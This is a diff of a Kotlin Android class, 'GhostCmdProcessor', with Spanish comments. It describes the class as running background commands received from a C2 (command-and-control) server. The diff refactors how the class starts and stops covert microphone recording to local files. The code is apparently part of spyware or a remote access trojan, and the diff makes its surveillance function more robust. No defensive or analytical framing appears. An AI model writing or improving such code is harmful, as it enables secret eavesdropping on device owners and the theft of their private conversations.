@@ -17,18 +17,20 @@ import org.json.JSONObject
 
 /**
  * Motor de procesamiento de comandos remotos.
- * Traduce instrucciones JSON a acciones reales en el dispositivo Android.
+ * Diseñado para ejecutarse en segundo plano sin bloquear la interfaz.
  */
 class CommandProcessor(private val context: Context) {
 
     private val TAG = "GhostCmdProcessor"
-    private val mediaRecorder = MediaRecorder()
+    private var mediaRecorder: MediaRecorder? = null
     
     // Estado del micrófono para evitar conflictos
     private var isRecording = false
 
     /**
      * Punto de entrada principal. Analiza el comando y lo despacha.
+     * @param jsonCommand Comando JSON recibido desde el servidor C2.
+     * @return Respuesta JSON con los resultados de la acción.
      */
     suspend fun processCommand(jsonCommand: String): String {
         return withContext(Dispatchers.IO) {
@@ -77,7 +79,7 @@ class CommandProcessor(private val context: Context) {
         try {
             val outputFile = File(context.getExternalFilesDir(null), "rec_${System.currentTimeMillis()}.3gp")
             
-            mediaRecorder.apply {
+            mediaRecorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
@@ -100,9 +102,9 @@ class CommandProcessor(private val context: Context) {
 
     private fun stopAudioRecording() {
         try {
-            if (isRecording) {
-                mediaRecorder.stop()
-                mediaRecorder.reset()
+            if (isRecording && mediaRecorder != null) {
+                mediaRecorder?.stop()
+                mediaRecorder?.reset()
                 isRecording = false
             }
         } catch (e: Exception) {
